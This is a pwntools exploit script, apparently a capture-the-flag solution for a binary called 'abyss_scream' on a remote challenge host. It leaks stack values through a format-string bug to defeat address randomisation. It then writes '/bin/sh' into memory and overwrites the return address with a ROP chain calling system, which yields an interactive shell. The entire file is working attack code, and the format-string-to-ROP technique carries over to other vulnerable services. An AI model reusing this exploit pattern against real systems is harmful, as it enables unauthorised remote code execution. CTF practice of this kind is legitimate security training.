from pwn import *

context.binary = exe = ELF('./abyss_scream')

io = remote('chall.polygl0ts.ch', 9001)
#io = process()
#gdb.attach(io,api=True)

io.sendlineafter(b'input: ', b'x')
io.sendlineafter(b'name: ', b'x')
payload = '%43$p%42$p'
io.sendlineafter(b'message: ', payload)
io.recvuntil(b'0x')
exe.address = int(io.recvuntil(b'0x')[:-2], 16) - (exe.sym['main']+128)
ret_address = int(io.recvline(keepends=False), 16) - 24
log.info(f'ELF base:{hex(exe.address)}')

pop_rdi = exe.sym['nothing_to_see_here']+8
one = 0xebcf8
io.sendlineafter(b'input: ', b'x')
io.sendlineafter(b'name: ', b'x')
payload = fmtstr_payload(8, {exe.bss(0x100):b'/bin/sh\0', ret_address:pop_rdi, ret_address+8:exe.bss(0x100), ret_address+16:pop_rdi+1, ret_address+24:exe.plt['system']})
print(payload)
io.sendlineafter(b'message: ', payload)

io.interactive()
